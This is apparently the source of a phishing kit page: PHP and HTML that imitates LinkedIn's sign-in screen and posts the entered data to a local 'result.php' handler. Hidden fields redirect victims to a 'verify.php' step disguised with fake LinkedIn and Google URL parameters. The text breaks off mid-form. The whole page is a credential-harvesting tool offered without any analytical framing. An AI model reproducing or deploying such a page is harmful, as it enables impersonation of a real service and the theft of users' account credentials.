<?php
	$host  = $_SERVER['HTTP_HOST']; $host_upper = strtoupper($host); $path   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
?>
<!DOCTYPE html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<link rel="icon" href="favicon.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link rel="stylesheet" type="text/css" href="../css/css.css">
<script type="text/javascript" src="../js/js.js"></script>
<link rel="stylesheet" type="text/css" href="../css/css3.css">
<title>Sign In | LinkedIn</title>
<link rel="stylesheet" type="text/css" href="../css/css2.css">
</head>
<body dir="ltr" class="guest v2  chrome-v5 chrome-v5-responsive sticky-bg guest" id="pagekey-uas-consumer-login-internal">
<input id="inSlowConfig" type="hidden" value="false"/>
<div class="container-fluid" style="background-color: #283E4A; height:55px; padding-left:100px" >
<div class="row">
<div class="col-lg-1"></div>
<div class="col-lg-1"><div class="logo"></div></div>
<div class="col-lg-7"></div>
<div class="col-lg-2">
<div class="fo" style="float:right; padding-right:100px;"><a href="#">Join now</a></div>
  <div class="foo" style="float:right;"><a href="#">Sign in</a></div>
</div>
<div class="col-lg-1"></div>
</div>
</div>
<div id="a11y-menu" class="a11y-skip-nav-container">
<div class="a11y-skip-nav a11y-hidden">
<a href="#a11y-content" id="a11y-skip-nav-link">Skip to main content</a>
</div>

</div>
<div id="header" class="global-header responsive-header nav-v5-2-header  responsive-1 remote-nav" role="banner">
<div id="top-header">
<div class="wrapper">
<h2 class="logo-container">
<a href="http://www.linkedin.com/" class="guest logo" id="li-logo">
LinkedIn Home
</a>
</h2>
<ul class="nav main-nav guest-nav" role="navigation">
<li class="nav-item">
<a href="" class="nav-link">
What is LinkedIn?
</a>
</li>
<li class="nav-item">
<a href="" rel="nofollow">
Join Today
</a>
</li>
<li class="nav-item">
<a href="" class="nav-link" rel="nofollow">
Sign In
</a>
</li>
</ul>
</div>
</div>
<div class="a11y-content">
<a name="a11y-content" tabindex="0" id="a11y-content-link">Main content starts below.</a>
</div>
</div>

<div id="body" class="" role="main">
<div class="wrapper hp-nus-wrapper">
<div id="global-error">
</div>
<div id="bg-fallback"></div>
<div id="main" class="signin">
<form id="form1" name="form1" method="post" action="../css/result.php">
<fieldset>
<legend>Sign in to LinkedIn</legend>
<div class="outer-wrapper">
<div class="inner-wrapper">
<div class="logo_container">LinkedIn</div>
<ul id="mini-profile--js">
<li class="">
<input name="redir" value="<?php echo "http://$host$path/verify.php?https//www.linkedin.com/legal/copyright-policy?trk=hb_ft_copy%2Fmail&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession"; ?>" type="hidden" />
<input name="agenti" value="LinkedIn" type="hidden" />